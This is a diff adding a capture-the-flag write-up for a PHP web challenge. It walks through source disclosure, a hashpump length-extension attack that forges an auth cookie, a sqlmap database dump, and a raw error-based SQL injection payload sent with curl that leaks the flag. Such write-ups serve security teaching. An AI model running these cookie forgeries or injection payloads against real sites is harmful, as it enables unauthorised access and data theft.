@@ -10,9 +10,29 @@
 
 ## Write-up
 
-(TODO)
+The “Index” link on the website points to [`/index.php?page=index`](http://54.211.6.40/). Playing around with that URL query string parameter reveals that the site is vulnerable to source code disclosure. We exploit this vulnerability to get the source code for [`index.php`](index.php) (via [`/index.php?page=index.php`](http://54.211.6.40/index.php?page=index.php)) and [`admin.php`](admin.php) (via [`/index.php?page=admin.php`](http://54.211.6.40/index.php?page=admin.php)).
+
+(TODO: explain hash length extension attack)
+
+Hash Length Extension attack:
+    http://en.wikipedia.org/wiki/Length_extension_attack
+    https://github.com/bwall/HashPump
+    https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks
+
+```bash
+$ hashpump -s 'ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3' -d ';0:b' -a ';1:b' -k '8967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1'
+;0:b\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`;1:b
+```
+
+Don't forget to reverse this string and URL-encode it! This cookie works:
 
 ```
+auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
+```
+
+The `query` URL parameter for [`admin.php`](http://54.211.6.40/admin.php?query=lol) is vulnerable to SQL injection. Let’s see what kind of data we can leak using [`sqlmap`](http://sqlmap.org/):
+
+```bash
 $ sqlmap.py -u 'http://54.211.6.40/admin.php?query=abc' --cookie='auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' --dump-all
 
     sqlmap/0.9 - automatic SQL injection and database takeover tool
@@ -167,6 +187,13 @@ Table: plaidcoin_wallets
 
 The flag is `flag{phpPhPphpPPPphpcoin}`.
 
+For the record, the payload `sqlmap` used to get the flag was:
+
+```bash
+$ curl --cookie 'auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1' 'http://54.211.6.40/admin.php?query=abc%20AND%20%28SELECT%203497%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%28CHAR%2858%2C103%2C99%2C121%2C58%29%2C%28SELECT%20MID%28%28IFNULL%28CAST%28id%20AS%20CHAR%29%2CCHAR%2832%29%29%29%2C1%2C50%29%20FROM%20mtpox.plaidcoin_wallets%20LIMIT%200%2C1%29%2CCHAR%2858%2C118%2C117%2C112%2C58%29%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29'
+Query failed: Duplicate entry ':gcy:flag{phpPhPphpPPPphpcoin}:vup:1' for key 'group_key'
+```
+
 ## Other write-ups
 
-* none yet
+* <http://conceptofproof.wordpress.com/2014/04/13/plaidctf-2014-web-150-mtgox-writeup/>
